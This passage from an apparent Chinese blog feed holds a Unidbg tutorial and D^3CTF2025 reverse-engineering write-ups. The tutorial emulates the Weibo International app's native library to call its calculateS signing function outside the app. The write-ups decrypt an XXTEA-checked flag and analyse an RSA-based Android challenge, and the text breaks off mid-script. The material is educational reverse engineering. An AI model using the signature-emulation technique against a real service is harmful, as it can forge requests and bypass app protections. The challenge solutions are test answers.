src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603102021157.png" alt="image-20250603102021157"></p><p>尽管都会依赖外部SO文件，但在这两篇文章里，我们似乎没有用到<strong>loadLibrary</strong>加载所需的这些SO文件。这是因为在SO的装载逻辑里，往往会解析依赖库，检查依赖库是否加载到当前内存中，如果未加载就尝试加载等等。</p><p>Android linker会这么做，Unidbg的ELF Loader当然也会这么做。尝试加载外部SO时，Android Linker会查找**&#x2F;verdor&#x2F;lib<strong>这样的系统库目录以及</strong>&#x2F;data&#x2F;app&#x2F;packageName&#x2F;base.apk!&#x2F;lib&#x2F;armeabi-v7a**这样的用户库目录。</p><p>Unidbg的ELF Loader也做了类似的处理，但逻辑上要简单很多。</p><p>对于系统库SO，Unidbg存在着一个系统库环境，包含着以libc.so为代表的常见SO文件。用户需要通过<strong>setLibraryResolver</strong>确认使用哪一个系统库文件，参数可选是23和19.</p><pre><code class="language-Java">// 模拟器的内存操作接口final Memory memory = emulator.getMemory();// 设置系统类库memory.setLibraryResolver(new AndroidResolver(23));</code></pre><p>23 和 19 分别对应于 sdk23（Android 6.0） 和 sdk19（Android 4.4）的运行库环境。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603102806733.png" alt="image-20250603102806733"></p><p>处理64位的SO文件时只能选择SDK23，因为Android4.4以上没有对应的64位系统库。即使处理32位SO文件，我们一般都是用SDK23，因为它相对“新”一些。</p><p>如果读者希望使用更高版本的运行时库，可以参考<strong>unidbg-android&#x2F;pull.sh</strong>，使用自己测试机的类库。但是，并非真机的SO放到Unidbg里就大功告成了，Unidbg为这两个环境做了一些优化和兼容性处理，比如多线程部分，你也需要做对应的处理才能让新环境可用。</p><p>接下来看看Unidbg寻找依赖SO的代码逻辑</p><pre><code class="language-Java">LibraryFile neededLibraryFile = libraryFile.resolveLibrary(emulator, neededLibrary);if (libraryResolver != null &amp;&amp; neededLibraryFile == null) &#123;    neededLibraryFile = libraryResolver.resolveLibrary(emulator, neededLibrary);&#125;</code></pre><p>第二处的<strong>resolveLibrary</strong>用于寻找系统库路径下是否有对应的SO，如下所示：</p><pre><code class="language-Java">protected static LibraryFile resolveLibrary(Emulator&lt;?&gt; emulator, String libraryName, int sdk, Class&lt;?&gt; resClass) &#123;    final String lib = emulator.is32Bit() ? &quot;lib&quot; : &quot;lib64&quot;;    String name = &quot;/android/sdk&quot; + sdk + &quot;/&quot; + lib + &quot;/&quot; + libraryName.replace(&#39;+&#39;, &#39;p&#39;);    URL url = resClass.getResource(name);    if (url != null) &#123;        return new URLibraryFile(url, libraryName, sdk, emulator.is64Bit());    &#125;    return null;&#125;</code></pre><p>第一处<strong>resolveLibrary</strong>用于寻找用户库路径下是否有对应SO文件，如下所示。上一小节说用libname比libFile更适合处理依赖模块的原因就在这里。</p><p>如果采用libFile方法加载，那就会在libFile的统计目录下寻找对应SO文件。</p><pre><code class="language-Java">@Overridepublic LibraryFile resolveLibrary(Emulator&lt;?&gt; emulator, String soName) &#123;    File file = new File(elfFile.getParentFile(), soName);    return file.canRead() ? new ElfLibraryFile(file, is64Bit) : null;&#125;</code></pre><p>如果采用libname方法加载，那就会在lib目录下寻找对应的SO文件。</p><pre><code class="language-Java">@Overridepublic LibraryFile resolveLibrary(Emulator&lt;?&gt; emulator, String soName) &#123;    byte[] libData = baseVM.loadLibraryData(apk, soName);    return libData == null ? null : new ApkLibraryFile(baseVM, this.apk, soName, libData, packageName, is64Bit);&#125;// 32 位byte[] loadLibraryData(Apk apk, String soName) &#123;    byte[] soData = apk.getFileData(&quot;lib/armeabi-v7a/&quot; + soName);    if (soData != null) &#123;        if (log.isDebugEnabled()) &#123;            log.debug(&quot;resolve armeabi-v7a library: &quot; + soName);        &#125;        return soData;    &#125;    soData = apk.getFileData(&quot;lib/armeabi/&quot; + soName);    if (soData != null &amp;&amp; log.isDebugEnabled()) &#123;        log.debug(&quot;resolve armeabi library: &quot; + soName);    &#125;    return soData;&#125;</code></pre><p>那么使用libFile加载时，使用者不仅要在lib下拷贝出目标SO文件，最好也将其他的SO拷贝出来，以防存在依赖，通过libname加载则不需要考虑这个问题。<br>当然也可以采用手动加载多个SO文件，像下面这样。</p><pre><code class="language-Java">vm.loadLibrary(&quot;kwsgmain&quot;, true);vm.loadLibrary(&quot;abc&quot;, true);</code></pre><h3 id="四、发起调用"><a href="#四、发起调用" class="headerlink" title="四、发起调用"></a>四、发起调用</h3><pre><code class="language-Java">public String callcalculateS()&#123;DvmObject&lt;?&gt; context = vm.resolveClass(&quot;android/app/Application&quot;, vm.resolveClass(&quot;android/content/ContextWrapper&quot;, vm.resolveClass(&quot;android/content/Context&quot;))).newObject(null);String arg2 = &quot;hello world&quot;;    String arg3 = &quot;123456&quot;;    String ret = WeiboSecurityUtils.newObject(null).callJniMethodObject(emulator, &quot;calculateS&quot;, context, arg2, arg3).getValue().toString();    return ret;&#125;</code></pre><p>参数2、3都是字符串，按照前篇所述直接传入就行。</p><p>参数1时Android中最常见的Context，为什么要这么处理？这样处理相当微妙，我们在后面的文章里讨论它。</p><p>运行报错如下</p><pre><code class="language-bash">JNIEnv-&gt;FindClass(android/content/pm/PackageManager) was called from RX@0x12002c79[libutility.so]0x2c79[15:58:55 618]  WARN [com.github.unidbg.linux.ARM32SyscallHandler] (ARM32SyscallHandler:538) - handleInterrupt intno=2, NR=0, svcNumber=0x11e, PC=unidbg@0xfffe0274, LR=RX@0x12002c8d[libutility.so]0x2c8d, syscall=nulljava.lang.UnsupportedOperationException: android/content/ContextWrapper-&gt;getPackageManager()Landroid/content/pm/PackageManager;at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethod(AbstractJni.java:933)at com.github.unidbg.linux.android.dvm.AbstractJni.callObjectMethod(AbstractJni.java:867)at com.github.unidbg.linux.android.dvm.DvmMethod.callObjectMethod(DvmMethod.java:69)</code></pre><p>报错原因就是我们在模拟执行的时候没有实现<strong>getPackageManager</strong>函数，因此我们需要在<strong>callObjectMethod</strong>函数中实现这个函数，简单的实现则是返回它所需要的值(一般用于占位即可)，补环境代码如下。函数签名已经在报错中了，可以直接使用。</p><pre><code class="language-Java">@Overridepublic DvmObject&lt;?&gt; callObjectMethod(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VarArg varArg) &#123;    switch (signature)&#123;        case &quot;android/content/ContextWrapper-&gt;getPackageManager()Landroid/content/pm/PackageManager;&quot;:&#123;            return vm.resolveClass(&quot;android/content/pm/PackageManager&quot;).newObject(null);        &#125;    &#125;    return super.callObjectMethod(vm, dvmObject, signature, varArg);&#125;</code></pre><p>继续运行，出现报错<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603160922255.png" alt="image-20250603160922255"></p><p>这个意思是传递给free函数的地址0x12175000是无效的，导致内存释放失败。遇到这个报错，最简单的处理办法就是 hook free 函数，替换它的实现，让它返回 0，即释放成功。当然也可以对报错的待释放内存做处理，比如只有指针地址是 0x12175000 释放失败时。</p><p>patch代码如下</p><pre><code class="language-Java">public void patchFree()&#123;        IWhale whale = Whale.getInstance(emulator);        Symbol free = memory.findModule(&quot;libc.so&quot;).findSymbolByName(&quot;free&quot;);        whale.inlineHookFunction(free, new ReplaceCallback() &#123;            @Override            public HookStatus onCall(Emulator&lt;?&gt; emulator, long originFunction) &#123;                System.out.println(&quot;WInlineHookFunction free = &quot; + emulator.getContext().getPointerArg(0));                long addr = emulator.getContext().getPointerArg(0).peer;                if (addr == 0x12175000 || addr == 0x12176000)&#123;                    return HookStatus.LR(emulator, 0);                &#125;                else &#123;                    return HookStatus.RET(emulator,originFunction);                &#125;            &#125;        &#125;);    &#125;</code></pre><p>完整代码如下。</p><pre><code class="language-Java">package com.test1;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.Emulator;import com.github.unidbg.Symbol;import com.github.unidbg.arm.HookStatus;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.arm.context.Arm32RegisterContext;import com.github.unidbg.debugger.BreakPointCallback;import com.github.unidbg.hook.ReplaceCallback;import com.github.unidbg.hook.whale.IWhale;import com.github.unidbg.hook.whale.Whale;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.*;import com.github.unidbg.memory.Memory;import unicorn.ArmConst;import java.io.File;public class TEST1 extends AbstractJni &#123;    private final AndroidEmulator emulator;    private final VM vm;    private final DvmClass WeiboSecurityUtils;    private final Memory memory;    public TEST1() &#123;        emulator = AndroidEmulatorBuilder                .for32Bit()                .addBackendFactory(new Unicorn2Factory(true))                .setProcessName(&quot;com.weico.international&quot;)                .build();        memory = emulator.getMemory();        memory.setLibraryResolver(new AndroidResolver(23));        vm = emulator.createDalvikVM(new File(&quot;D:\\Compilation_Enviroment\\unidbg-master\\unidbg-android\\src\\test\\java\\com\\test1\\sinaInternational.apk&quot;));        //设置当前类为虚拟机的JNI接口实现，即告诉虚拟机，如果 native 层调用 Java 方法、访问 Java 字段，使用我（这个类）来处理。        vm.setJni(this);        //打开 unidbg 的详细日志输出（verbose mode）        vm.setVerbose(true);        DalvikModule dm = vm.loadLibrary(&quot;utility&quot;, true);        WeiboSecurityUtils = vm.resolveClass(&quot;com/sina/weibo/security/WeiboSecurityUtils&quot;);        dm.callJNI_OnLoad(emulator);        patchFree();    &#125;    public String callS()&#123;        DvmObject&lt;?&gt; context = vm.resolveClass(&quot;android/app/Application&quot;, vm.resolveClass(&quot;android/content/ContextWrapper&quot;, vm.resolveClass(&quot;android/content/Context&quot;))).newObject(null);        String arg2 = &quot;hello world&quot;;        String arg3 = &quot;123456&quot;;        // String ret =        return  WeiboSecurityUtils.newObject(null).callJniMethodObject(emulator, &quot;calculateS&quot;, context, arg2, arg3).getValue().toString();    &#125;    public static void main(String[] args) &#123;        TEST1 test1 = new TEST1();        String result = test1.callS();        System.out.println(&quot;call s result:&quot;+result);    &#125;    @Override    public DvmObject&lt;?&gt; callObjectMethod(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VarArg varArg) &#123;        switch (signature)&#123;            case &quot;android/content/ContextWrapper-&gt;getPackageManager()Landroid/content/pm/PackageManager;&quot;:&#123;                return vm.resolveClass(&quot;android/content/pm/PackageManager&quot;).newObject(null);            &#125;        &#125;        return super.callObjectMethod(vm, dvmObject, signature, varArg);    &#125;    public void patchFree()&#123;        IWhale whale = Whale.getInstance(emulator);        Symbol free = memory.findModule(&quot;libc.so&quot;).findSymbolByName(&quot;free&quot;);        whale.inlineHookFunction(free, new ReplaceCallback() &#123;            @Override            public HookStatus onCall(Emulator&lt;?&gt; emulator, long originFunction) &#123;                System.out.println(&quot;WInlineHookFunction free = &quot; + emulator.getContext().getPointerArg(0));                long addr = emulator.getContext().getPointerArg(0).peer;                if (addr == 0x12175000 || addr == 0x12176000)&#123;                    return HookStatus.LR(emulator, 0);                &#125;                else &#123;                    return HookStatus.RET(emulator,originFunction);                &#125;            &#125;        &#125;);    &#125;&#125;</code></pre><p>运行结果</p><pre><code class="language-bash">call s result:d74a75bb</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>[Unidbg 的基本使用（二）](<a href="https://www.yuque.com/lilac-2hqvv/xdwlsg/vy2p4ts1oq8sxxgb#">https://www.yuque.com/lilac-2hqvv/xdwlsg/vy2p4ts1oq8sxxgb?#</a> 《Unidbg 的基本使用（二）》)</p><p>[补库函数（五）](<a href="https://www.yuque.com/lilac-2hqvv/xdwlsg/bzoykwvuim3hkz2o#">https://www.yuque.com/lilac-2hqvv/xdwlsg/bzoykwvuim3hkz2o?#</a> 《补库函数（五）》)</p>]]></content>
      
      
      <categories>
          
          <category> Unidbg学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unidbg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D^3CTF2025</title>
      <link href="/2025/05/31/D%5E3CTF2025/"/>
      <url>/2025/05/31/D%5E3CTF2025/</url>
      
        <content type="html"><![CDATA[<h1 id="D-3CTF2025"><a href="#D-3CTF2025" class="headerlink" title="D^3CTF2025"></a>D^3CTF2025</h1><h3 id="d3rpg-revenge"><a href="#d3rpg-revenge" class="headerlink" title="d3rpg-revenge"></a>d3rpg-revenge</h3><p>是一个游戏，并且随着在游戏中的对话，会改变程序的内存(不可恢复，除非删了重来)。然后玩了下，发现走到二楼和NPC直接对话，会问你是reverse手，misc手还是musc手，选reverse手就会直接让你输入flag，然后回车，显示checking…，再回车，就会有回显，由于附件中有exe和不少dll，并且还有一个自定义的文件，.d3ssad文件。分析结果是：脱壳后的<strong>secret_dll.dll</strong>中的check_flag函数中的字符串就是密文<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/a50912a3fc754cffe94fc13fba5a6d9b.png" alt="a50912a3fc754cffe94fc13fba5a6d9b"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/ad9c8b1f242312c34bc5bb485d49039c.png" alt="ad9c8b1f242312c34bc5bb485d49039c"></p><p>然后加密逻辑在<strong>d3rpg.dll</strong>文件中进行载入，载入的内容应该是<strong>d3rpg.d3ssad</strong>文件进行解密的结果(应该是这样)。那么我们知道当程序运行的时候，check flag的时候，肯定会将自定义的文件进行解密，加载到内存中，然后调用其中逻辑，进行check。既然如此，我们就可以用ce，重开游戏，直接走到二楼，和NPC对话，直接输入flag，然后回车，让程序就断在checking…这里，然后用ce去内存中找，找到加密逻辑<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250531162103708.png" alt="image-20250531162103708"></p><pre><code class="language-ruby">module Scene_RPG  class Secret_Class    DELTA = 0x1919810 | (($de1ta + 1) * 0xf0000000)    def initialize(new_key)      @key = str_to_longs(new_key)      if @key.length &lt; 4        @key.length.upto(4) &#123; |i| @key[i] = 0 &#125;      end    end    def self.str_to_longs(s, include_count = false)      s = s.dup      length = s.length      ((4 - s.length % 4) &amp; 3).times &#123; s &lt;&lt; &quot;\0&quot; &#125;      unpacked = s.unpack(&#39;V*&#39;).collect &#123; |n| int32 n &#125;      unpacked &lt;&lt; length if include_count      unpacked    end    def str_to_longs(s, include_count = false)      self.class.str_to_longs s, include_count    end    def self.longs_to_str(l, count_included = false)      s = l.pack(&#39;V*&#39;)      s = s[0...(l[-1])] if count_included      s    end    def longs_to_str(l, count_included = false)      self.class.longs_to_str l, count_included    end    def self.int32(n)      n -= 4_294_967_296 while (n &gt;= 2_147_483_648)      n += 4_294_967_296 while (n &lt;= -2_147_483_648)      n.to_i    end    def int32(n)      self.class.int32 n    end    def mx(z, y, sum, p, e)      int32(        ((z &gt;&gt; 5 &amp; 0x07FFFFFF) ^ (y &lt;&lt; 2)) +        ((y &gt;&gt; 3 &amp; 0x1FFFFFFF) ^ (z &lt;&lt; 4))      ) ^ int32((sum ^ y) + (@key[(p &amp; 3) ^ e] ^ z))    end    def self.encrypt(key, plaintext)      self.new(key).encrypt(plaintext)    end    def encrypt(plaintext)      return &#39;&#39; if plaintext.length == 0      v = str_to_longs(plaintext, true)      v[1] = 0 if v.length == 1      n = v.length - 1      z = v[n]      y = v[0]      q = (6 + 52 / (n + 1)).floor      sum = $de1ta * DELTA      p = 0      while(0 &lt;= (q -= 1)) do        sum = int32(sum + DELTA)        e = sum &gt;&gt; 2 &amp; 3        n.times do |i|          y = v[i + 1];          z = v[i] = int32(v[i] + mx(z, y, sum, i, e))          p = i        end        p += 1        y = v[0];        z = v[p] = int32(v[p] + mx(z, y, sum, p, e))      end      longs_to_str(v).unpack(&#39;a*&#39;).pack(&#39;m&#39;).delete(&quot;\n&quot;)    end    def self.decrypt(key, ciphertext)      self.new(key).decrypt(ciphertext)    end  endenddef validate_flag(input_flag)  c_flag = input_flag + &quot;\0&quot;  result = $check_flag.call(c_flag)  result == 1enddef check  flag = $game_party.actors[0].name  key = Scene_RPG::Secret_Class.new(&#39;rpgmakerxp_D3CTF&#39;)  cyphertext = key.encrypt(flag)  if validate_flag(cyphertext)    $game_variables[1] = 100  else    $game_variables[1] = 0  endenddef check1  flag = $game_party.actors[0].name  if flag == &quot;ImPsw&quot;    $game_variables[2] = 100  else    $game_variables[2] = 0  endend</code></pre><p>密钥也有了，delta的值，是</p><pre><code>0x1919810 | ((0 + 1) * 0xf0000000))</code></pre><p>$delta的值是0，那么就可以写脚本解密了</p><pre><code class="language-python">from ctypes import *import libnumdef MX(z, y, sum1, k, p, e):    return c_uint32(((z.value &gt;&gt; 5 ^ y.value &lt;&lt; 2) + (y.value &gt;&gt; 3 ^ z.value &lt;&lt; 4)) ^ (            (sum1.value ^ y.value) + (k[(p &amp; 3) ^ e.value] ^ z.value)))def btea(v, k, n, delta):    if n &gt; 1:        sum1 = c_uint32(0)        z = c_uint32(v[n - 1])        rounds = 6 + 52 // n        e = c_uint32(0)        while rounds &gt; 0:            sum1.value += delta            e.value = ((sum1.value &gt;&gt; 2) &amp; 3)            for p in range(n - 1):                y = c_uint32(v[p + 1])                v[p] = c_uint32(v[p] + MX(z, y, sum1, k, p, e).value).value                z.value = v[p]            y = c_uint32(v[0])            v[n - 1] = c_uint32(v[n - 1] + MX(z, y, sum1, k, n - 1, e).value).value            z.value = v[n - 1]            rounds -= 1    else:        sum1 = c_uint32(0)        n = -n        rounds = 6 + 52 // n        sum1.value = rounds * delta        y = c_uint32(v[0])        e = c_uint32(0)        while rounds &gt; 0:            e.value = ((sum1.value &gt;&gt; 2) &amp; 3)            for p in range(n - 1, 0, -1):                z = c_uint32(v[p - 1])                v[p] = c_uint32(v[p] - MX(z, y, sum1, k, p, e).value).value                y.value = v[p]            z = c_uint32(v[n - 1])            v[0] = c_uint32(v[0] - MX(z, y, sum1, k, 0, e).value).value            y.value = v[0]            sum1.value -= delta            rounds -= 1    return vif __name__ == &#39;__main__&#39;:    a = [0x2e, 0x15, 0x6f, 0x7d, 0xea, 0x72, 0xc0, 0x52, 0x2c, 0x1d,         0xbf, 0x06, 0xf2, 0x43, 0x5d, 0xbb, 0x8f, 0x49, 0xde, 0x4d]    a = [int.from_bytes(a[i:i + 4], &quot;little&quot;) for i in range(0, len(a), 4)]    for i in range(4):        print(hex(a[i]), end=&quot;, &quot;)    print()    k = [0x72, 0x70, 0x67, 0x6d, 0x61, 0x6b, 0x65, 0x72, 0x78, 0x70,         0x5f, 0x44, 0x33, 0x43, 0x54, 0x46]    k = [int.from_bytes(k[i:i + 4], &quot;little&quot;) for i in range(0, len(k), 4)]    for i in range(4):        print(hex(k[i]), end=&quot;, &quot;)    print()    n = len(a)    delta = 0xf1919810    res = btea(a, k, -n, delta)    print(&#39;,&#39;.join(hex(x) for x in res))    flag = &#39;&#39;    for i in res:        flag += (libnum.n2s(i)[::-1].decode())    print(flag)</code></pre><p><strong>d3ctf{Y0u_R_RPG_M4st3r}</strong></p><hr><h3 id="d3piano"><a href="#d3piano" class="headerlink" title="d3piano"></a>d3piano</h3><h4 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h4><p>有点可惜，比赛做的时候不够细心，导致很多错过关键性的一些细节处。赛后复现…</p><h4 id="二、开始"><a href="#二、开始" class="headerlink" title="二、开始"></a>二、开始</h4><p>是一个模拟钢琴的APK，但只包含了一个八度，7个白键5个黑键。Java层只有APK启动页面的琴键绘制的逻辑，check逻辑都在so层<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603193408723.png" alt="image-20250603193408723"></p><p>然后每个键所对应的琴音，根据so层的<strong>keysoundnames</strong>数组的内容来加载琴音资源<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603193635847.png" alt="image-20250603193635847"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603193723987.png" alt="image-20250603193723987"></p><p>但是点击的逻辑，不知道什么原因，我的jadx反编译不正常，但是使用jeb就好了<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603193833394.png" alt="image-20250603193833394"></p><p>完整代码</p><pre><code class="language-Java">@Override  // android.view.View    public boolean onTouchEvent(MotionEvent event) &#123;        Intrinsics.checkNotNullParameter(event, &quot;event&quot;);        int v = event.getActionMasked();        float f = event.getX();        float f1 = event.getY();        switch(v) &#123;            case 0:             case 5: &#123;                int v2 = this.keyPaths.size();                for(int i = 0; i &lt; v2; ++i) &#123;                    Region region = new Region();                    RectF rectF = new RectF();                    ((Path)this.keyPaths.get(i)).computeBounds(rectF, true);                    region.setPath(((Path)this.keyPaths.get(i)), new Region(((int)rectF.left), ((int)rectF.top), ((int)rectF.right), ((int)rectF.bottom)));                    if(region.contains(((int)f), ((int)f1))) &#123;                        this.pressedKeys.add(Integer.valueOf(i));                        SoundPool soundPool0 = this.soundPool;                        if(soundPool0 != null) &#123;                            soundPool0.play(((Number)this.keySounds.get(i)).intValue(), 1.0f, 1.0f, 1, 0, 1.0f);                        &#125;                        if(this.check(i)) &#123;                            String s = this.getflag();                            Toast.makeText(this.Mycontext, &quot;Congratulations, this is music exclusive to Flag&quot;, 0).show();                            Log.i(&quot;D3CTF_FLAG&quot;, s);                        &#125;                        this.invalidate();                        return true;                    &#125;                &#125;                return true;            &#125;            case 1:             case 6: &#123;                int v4 = this.keyPaths.size();                break;            &#125;            default: &#123;                return true;            &#125;        &#125;        for(int i = 0; i &lt; v4; ++i) &#123;            Region region = new Region();            RectF rectF = new RectF();            ((Path)this.keyPaths.get(i)).computeBounds(rectF, true);            region.setPath(((Path)this.keyPaths.get(i)), new Region(((int)rectF.left), ((int)rectF.top), ((int)rectF.right), ((int)rectF.bottom)));            if(region.contains(((int)f), ((int)f1))) &#123;                this.pressedKeys.remove(Integer.valueOf(i));                this.invalidate();                return true;            &#125;        &#125;        return true;    &#125;</code></pre><p>获取当前点击位置，判断属于哪个琴键，切换琴键，然后发出声音。如果是0号白键就使用keySound[0]，而keySound[0]的音调由keysoundnames数组决定，比如keysoundname[0] &#x3D;&#x3D; ‘C’，则0号白键就发出”C”的音调。，每次按下都会将琴键的序号传给so层的check函数进行判断，如果返回true就执行getflag的逻辑，然后log出flag。</p><p>接下来分析so层，从Java层分析得知apk只加载了一个libD3Piano.so。</p><p>先看<strong>JNI_OnLoad</strong>函数，由于ida对一些结构体无法识别，手动修复一下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603194633065.png" alt="image-20250603194633065"></p><p>很显然，check方法是动态注册的<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250603194714070.png" alt="image-20250603194714070"></p><p>跟进分析</p><pre><code class="language-c++">__int64 sub_29BD4()&#123;  __int64 v0; // x0  size_t n; // x0  int i; // [xsp+40h] [xbp-480h]  unsigned __int8 v4; // [xsp+5Ch] [xbp-464h]  _BYTE result1[16]; // [xsp+80h] [xbp-440h] BYREF  char result2[16]; // [xsp+90h] [xbp-430h] BYREF  char resul3[1048]; // [xsp+A0h] [xbp-420h] BYREF  __int64 v8; // [xsp+4B8h] [xbp-8h]  v8 = *(_ReadStatusReg(TPIDR_EL0) + 40);  memset(resul3, 0, sizeof(resul3));  sub_29DB0(&amp;input_str);  if ( getlength(&amp;input_str) != 42 )    goto LABEL_7;  __gmpz_inits();  WHAT(&amp;input_str);  __gmpz_set_str(result1, v0, 12);              // 十二进制转十进制  sub_29B44(result2, result1);                  // RSA  __gmpz_get_str(resul3, 16, result2);  for ( i = 0; i &lt; __strlen_chk(resul3, 0x418u); ++i )    resul3[i] = encrypt(resul3[i]);             // 还进行一个针对除大写字母以外的其他字符处理  n = __strlen_chk(resul3, 0x418u);  if ( !memcmp(resul3, aC901acacbb426c, n) )    // &quot;c901acacbb426c9c447acda82513965ccc3faf6c9dc58d24ed34b62c7fb1548f9ad06b9355c7d20704cfdfdfc89a3f893801e31719564683fdc7de26d807ed27f898edb3efd51b6e8e2a192d6a0929554342adfed541cd8399da0fbacfeaa5b608b887fd74f4f0e31f9bb5816c54163b8e46d27553798233bef6eaf848c64e&quot;  &#123;    __android_log_print(4, &quot;D3PianoLog&quot;, &quot;YOooou are Right??!&quot;);    v4 = 1;  &#125;  else  &#123;LABEL_7:    v4 = 0;  &#125;  _ReadStatusReg(TPIDR_EL0);  return v4;&#125;</code></pre><p>根据具体逻辑的分析，对函数进行了一些重命名和注释</p><p>跟进RSA加密函数</p><pre><code class="language-c++">__int64 __fastcall RSA_part(__int64 a1, __int64 a2, __int64 a3)&#123;  __int64 result; // x0  int v4; // [xsp+3Ch] [xbp-84h]  int n11; // [xsp+44h] [xbp-7Ch]  unsigned int v6; // [xsp+48h] [xbp-78h]  _BYTE v10[32]; // [xsp+68h] [xbp-58h] BYREF  _BYTE v11[16]; // [xsp+88h] [xbp-38h] BYREF  _BYTE v12[16]; // [xsp+98h] [xbp-28h] BYREF  _BYTE v13[16]; // [xsp+A8h] [xbp-18h] BYREF  __int64 v14; // [xsp+B8h] [xbp-8h]  v14 = *(_ReadStatusReg(TPIDR_EL0) + 40);  v6 = 0;  srand(0x221221u);                             // 伪随机  for ( n11 = 0; n11 &lt;= 11; ++n11 )  &#123;    v4 = *(key + 4LL * n11);    v6 += v4 * rand();  &#125;  __gmpz_inits();  __gmp_randinit_mt();  __gmp_randseed_ui(v10, v6);  sub_29940(v13, v10, 512);  sub_29940(v12, v10, 512);  __gmpz_mul(a1, v13, v12);  __gmpz_sub_ui(v13);  __gmpz_sub_ui(v12);  __gmpz_mul(v11, v13, v12);  __gmpz_set_ui(a2, 65537);  __gmpz_invert(a3, a2, v11);  __gmpz_clears(v13, v12, v11, 0);  result = __gmp_randclear(v10);  _ReadStatusReg(TPIDR_EL0);  return result;&#125;</code></pre><p>for循环中有一个数组，交叉引用后发现是在<strong>Java_com_d3ctf2025_D3piano_PianoLayout_getkeysoundnames</strong>中进行初始化的，也就是琴键的琴音的索引组成的数组，然后根据index生成soundnames数组<br>对部分数组进行重命名</p><pre><code class="language-c++">__int64 __fastcall Java_com_d3ctf2025_D3piano_PianoLayout_getkeysoundnames(JNIEnv *a1, __int64 a2, signed int a3)&#123;  __int64 v4; // [xsp+10h] [xbp-50h]  signed int i; // [xsp+1Ch] [xbp-44h]  __int64 v6; // [xsp+20h] [xbp-40h]  jclass Class_w; // [xsp+28h] [xbp-38h]  __int64 v10; // [xsp+48h] [xbp-18h]  _BYTE v11[4]; // [xsp+54h] [xbp-Ch] BYREF  __int64 v12; // [xsp+58h] [xbp-8h]  v12 = *(_ReadStatusReg(TPIDR_EL0) + 40);  keysoundindex = getkeysoundindex(a3);  Class_w = FindClass_w(a1, &quot;java/lang/String&quot;);  if ( Class_w )  &#123;    v6 = sub_293D4(a1, a3, Class_w, 0);    if ( v6 )    &#123;      for ( i = 0; i &lt; a3; ++i )      &#123;        v11[0] = aCdefgabdegab[*(keysoundindex + 4LL * i)];        v11[1] = 0;        v4 = sub_29418(a1, v11);        if ( !v4 )        &#123;          v10 = 0;          goto LABEL_11;        &#125;        sub_2944C(a1, v6, i, v4);        sub_29490(a1, v4);      &#125;      v10 = v6;    &#125;    else    &#123;      v10 = 0;    &#125;  &#125;  else  &#123;    v10 = 0;  &#125;LABEL_11:  _ReadStatusReg(TPIDR_EL0);  return v10;&#125;</code></pre><p>再跟进分析<strong>getkeysoundindex</strong>函数，</p><pre><code class="language-c++">std::chrono::system_clock *__fastcall getkeysoundindex(int a1)&#123;  unsigned __int64 v1; // x0  std::chrono::system_clock *v2; // x0  int j; // [xsp+3Ch] [xbp-74h]  __int64 v5; // [xsp+40h] [xbp-70h]  __int64 v6; // [xsp+48h] [xbp-68h]  unsigned int v7; // [xsp+54h] [xbp-5Ch]  int i; // [xsp+58h] [xbp-58h]  std::chrono::system_clock *v9; // [xsp+68h] [xbp-48h]  char v11[8]; // [xsp+78h] [xbp-38h] BYREF  __int64 v12; // [xsp+80h] [xbp-30h] BYREF  __int64 v13; // [xsp+88h] [xbp-28h] BYREF  _QWORD v14[4]; // [xsp+90h] [xbp-20h] BYREF  v14[3] = *(_ReadStatusReg(TPIDR_EL0) + 40);  sub_294C4(v14, a1);  if ( a1 &gt;&gt; 62 )    v1 = -1;  else    v1 = 4LL * a1;  v2 = operator new[](v1);  v9 = v2;  for ( i = 0; i &lt; a1; ++i )  &#123;    v2 = sub_295E4(v14, i);    *v2 = i;  &#125;  v12 = std::chrono::system_clock::now(v2);  v13 = sub_29608(&amp;v12);  v7 = sub_29660(&amp;v13);  sub_29678(v11, v7);  v6 = sub_29718(v14);  v5 = sub_29748(v14);  sub_296A4(v6, v5, v11);  for ( j = 0; j &lt; a1; ++j )    *(v9 + j) = *sub_295E4(v14, j);  sub_29778(v14);  _ReadStatusReg(TPIDR_EL0);  return v9;&#125;</code></pre><p>静态分析的时候，结合ai的分析结果，误以为是打乱随机的，没有把注意具体点击的时候发出的声音，其实根本没有打乱，琴键的音调是完全正确的。这里的生成乱序keysoundindex没有生效，<strong>keysoundindex</strong>就是0-11的顺序…(比赛的时候通过Frida hook的时候确实发现每个琴键所对应的index是固定的，但是没注意每个index和每个音调也是一一对应的)</p><p>动态注册的check函数里使用的GMP大数库，看官方wp说很多函数的符号ida分析错误，但貌似影响也不大。check函数的逻辑就是把琴键的index拼接成一个12进制的字符串然后作为大数值，完了进行加密，再转换成十六进制字符串，进行比较。</p><p>比赛的时候一直以为keysoundindex是随机的，所以RSA一直解不出来…</p><p>官方wp中的解密脚本</p><pre><code class="language-python">from Crypto.Util.number import long_to_bytesp = 0xcd88775691357147eea5dc584718edab9ca314cdd52a8c1cf847dbbb8371798f15e9bdca2bfaa4595d47eecae21bea38691a26e1c707867b5ea2f6f2f03bf4c+1q = 